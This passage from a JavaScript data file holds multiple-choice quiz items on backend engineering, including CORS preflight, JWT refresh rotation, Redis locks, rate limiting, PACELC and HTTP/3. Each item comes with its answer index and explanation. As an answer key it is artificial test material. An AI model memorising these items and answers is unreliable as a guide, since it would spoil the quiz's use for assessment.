      'When the cross-origin request is NOT a "Simple Request": e.g., if the method is PUT/DELETE/PATCH, if custom headers like `Authorization` or `X-Custom-Header` are present, or if `Content-Type` is anything other than `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` (such as `application/json`).',
      'Whenever the client browser is Chrome or Safari.',
      'Only when the URL contains query parameters.'
    ],
    correctIndex: 1,
    explanation: 'Browsers safeguard servers from non-idempotent cross-origin requests. Because `application/json` with custom auth headers is not a Simple Request, the browser must send an `OPTIONS` preflight request with `Access-Control-Request-Method` and verify the server allows it before sending the actual payload.'
  },
  {
    id: 'final-17',
    category: 'Identity & Token Security',
    question: 'Why are stateless JWT access tokens intentionally given short lifespans (e.g. 5–15 minutes) paired with Refresh Token Rotation in high-security applications?',
    options: [
      'Because longer JWTs exceed browser cookie size limits of 4KB.',
      'Stateless JWTs cannot be revoked server-side without maintaining a centralized distributed blacklist (which destroys statelessness); a short lifespan limits the window of opportunity if a token is intercepted, while Refresh Token Rotation issues a single-use refresh token that detects reuse attacks and immediately invalidates the entire session hierarchy if re-played.',
      'Stateless JWTs lose encryption keys every 15 minutes automatically.',
      'OAuth 2.0 specifications prohibit tokens from lasting more than 10 minutes.'
    ],
    correctIndex: 1,
    explanation: 'Once signed, a stateless JWT is valid until expiration. If compromised, an attacker has unrestricted access unless revoked. Keeping access token TTL to 5–15 minutes bounds exposure. When the client uses a Refresh Token to get a new access token, the auth server replaces the refresh token with a new one; if an old refresh token is reused, all related tokens are purged.'
  },
  {
    id: 'final-18',
    category: 'Distributed Concurrency & Locking',
    question: 'When implementing a distributed lock using Redis, why is a simple `SETNX` without an expiration time considered dangerous, and why is a unique random token required when releasing via Lua script?',
    options: [
      'Redis SETNX only works with integer values.',
      'Without TTL, if the process crashes or network cuts out before releasing the lock, the system enters an indefinite permanent deadlock; the unique token is required so that when releasing via Lua script (`if redis.call("get", KEYS[1]) == ARGV[1] then return redis.call("del", KEYS[1])`), a thread whose execution took longer than the TTL does NOT accidentally delete another thread\'s lock.',
      'Lua scripts are required because Redis does not support atomic operations.',
      'SETNX requires 3 master nodes to execute.'
    ],
    correctIndex: 1,
    explanation: 'Atomic acquisition with lease time (`SET key token NX PX 5000`) prevents permanent deadlock. Checking the unique token inside an atomic Lua script guarantees that if Thread 1 experienced a GC pause and lost its lock to Thread 2, Thread 1 won\'t wake up and delete Thread 2\'s lock.'
  },
  {
    id: 'final-19',
    category: 'Database Connection Management',
    question: 'In high-throughput microservices using connection pools like HikariCP, why is the formula `connections = ((core_count * 2) + effective_spindle_count)` commonly recommended over allocating 500+ connections per service pod?',
    options: [
      'Database engines can only open 32 connections per port.',
      'Excessive database connections cause severe CPU thrashing due to OS thread context switching, lock contention, and memory exhaustion in the DB engine; a smaller, well-sized pool matches CPU core saturation and disk spindle capability, maximizing transactions per second while drastically reducing queuing latency.',
      'HikariCP throws an OutOfMemoryError if pool size exceeds 100.',
      'PostgreSQL requires 1 GB of RAM per connection.'
    ],
    correctIndex: 1,
    explanation: 'PostgreSQL forks a backend process per connection; MySQL allocates thread resources. When 500 connections compete on a 16-core database, the CPU spends all its time context switching instead of executing queries. Sizing pools appropriately keeps the database operating in its optimal performance zone.'
  },
  {
    id: 'final-20',
    category: 'Rate Limiting Algorithms',
    question: 'What is the primary difference between a Token Bucket rate limiter and a Leaky Bucket rate limiter in API traffic shaping?',
    options: [
      'Token Bucket is written in Python; Leaky Bucket is written in C++.',
      'Token Bucket allows burstiness: tokens accumulate up to capacity, allowing a burst of requests to pass immediately if tokens exist; Leaky Bucket enforces a strictly smoothed constant output rate, processing requests at a fixed leak pace regardless of incoming burst volume, smoothing out spikes.',
      'Leaky Bucket discards 50% of all requests automatically.',
      'Token Bucket cannot be implemented in distributed Redis clusters.'
    ],
    correctIndex: 1,
    explanation: 'Token Bucket is ideal for APIs that permit legitimate traffic bursts (e.g. page loads requesting 10 assets). Leaky Bucket (often FIFO queue based) smooths traffic to downstream dependencies that cannot tolerate surges and require constant flow.'
  },
  {
    id: 'final-21',
    category: 'Distributed Systems & CAP',
    question: 'Under the PACELC theorem (an extension of CAP), in a distributed database when there is NO network partition (the "Else" clause), what is the fundamental trade-off?',
    options: [
      'Trade-off between Storage Cost and Network Bandwidth.',
      'Trade-off between Latency (L) and Consistency (C): the system must choose between low response time (reading locally/asynchronously without cross-node synchronization) vs strong consistency (waiting for quorum confirmation across replica nodes before returning).',
      'Trade-off between Security and Encryption speed.',
      'Trade-off between Docker containers and Virtual Machines.'
    ],
    correctIndex: 1,
    explanation: 'CAP states: If Partition (P), choose Availability (A) or Consistency (C). PACELC extends this: Else (E), when normal operations occur without partitions, choose between Latency (L) and Consistency (C). Systems like MongoDB or Cassandra let users tune this via Read/Write Concerns.'
  },
  {
    id: 'final-22',
    category: 'Deployment & Release Strategies',
    question: 'What is the principal architectural difference between a Canary Deployment and a Blue/Green Deployment?',
    options: [
      'Canary deployment only works on Kubernetes; Blue/Green only works on bare metal.',
      'Blue/Green provisions two identical full-scale environments (Blue active, Green idle) and switches all router traffic simultaneously at 100%; Canary deploys the new release to a small fraction of nodes/traffic (e.g. 5%), monitors metrics and error budgets in production, and incrementally ramps traffic up to 100% only if SLOs are satisfied.',
      'Blue/Green deployment requires destroying the database before switching.',
      'Canary deployment requires using Jenkins rather than GitHub Actions.'
    ],
    correctIndex: 1,
    explanation: 'Blue/Green provides instant rollback by switching load balancer targets, but requires 2x infrastructure cost. Canary allows real user testing with minimal blast radius: if errors or latency spike on the 5% canary group, the release halts automatically before impacting 95% of users.'
  },
  {
    id: 'final-23',
    category: 'Web Performance & CDN',
    question: 'In modern HTTP caching headers, what is the exact function of the `stale-while-revalidate` Cache-Control directive?',
    options: [
      'It forces browsers to re-download all assets on every single page click.',
      'It instructs the browser or CDN edge to immediately serve a cached stale response to the user while asynchronously triggering a background validation request to the origin server to fetch and update the cache with fresh content, eliminating user-facing latency.',
      'It invalidates all Redis cache keys after 60 seconds.',
      'It disables TLS session resumption in edge proxies.'
    ],
    correctIndex: 1,
    explanation: '`Cache-Control: max-age=600, stale-while-revalidate=30` gives users instant zero-latency responses even if the asset is slightly stale, while refreshing the cache in the background without blocking the UI thread.'
  },
  {
    id: 'final-24',
    category: 'Distributed Data Storage',
    question: 'In distributed NoSQL clusters (like Apache Cassandra or Amazon DynamoDB), how does Consistent Hashing with Virtual Nodes (vnodes) address server hot-spotting?',
    options: [
      'It encrypts every primary key with a 512-bit AES key.',
      'It maps each physical node to multiple distinct positions (tokens) across the 360-degree hash ring; when a physical server is added or removed, its load is evenly distributed across many peer nodes rather than shifting an entire contiguous hash partition onto a single neighboring node.',
      'It replaces TCP with UDP for inter-node gossip protocols.',
      'It enforces single-threaded write operations across all cluster disks.'
    ],
    correctIndex: 1,
    explanation: 'Consistent hashing without vnodes causes non-uniform token distribution. Virtual nodes allocate 128 or 256 virtual tokens per physical machine across the ring. This ensures balanced data distribution across nodes of varying hardware capacities and smooth redistribution during scale-out.'
  },
  {
    id: 'final-25',
    category: 'Network & Transport Protocols',
    question: 'How does HTTP/2 and HTTP/3 Multiplexing solve the classic "Head-of-Line (HoL) Blocking" problem found in HTTP/1.1?',
    options: [
      'By opening 500 simultaneous TCP sockets per domain.',
      'HTTP/2 divides requests and responses into discrete binary frames multiplexed over a single TCP connection, allowing concurrent streams without waiting for earlier requests to complete; HTTP/3 takes this further by replacing TCP with QUIC (UDP), eliminating TCP-level packet loss HoL blocking across individual streams.',
      'HTTP/2 compresses all JSON payloads into zip archives automatically.',
      'HTTP/3 disables all encryption handshakes to increase network speed.'
    ],
    correctIndex: 1,
    explanation: 'In HTTP/1.1, pipelining suffered from HoL blocking because responses had to arrive in exact request order. HTTP/2 introduces binary framing and stream IDs over 1 TCP connection. However, if 1 TCP packet dropped, all HTTP/2 streams stalled. HTTP/3 uses QUIC (over UDP) so packet loss on Stream 1 does not pause Stream 2.'
  }
];

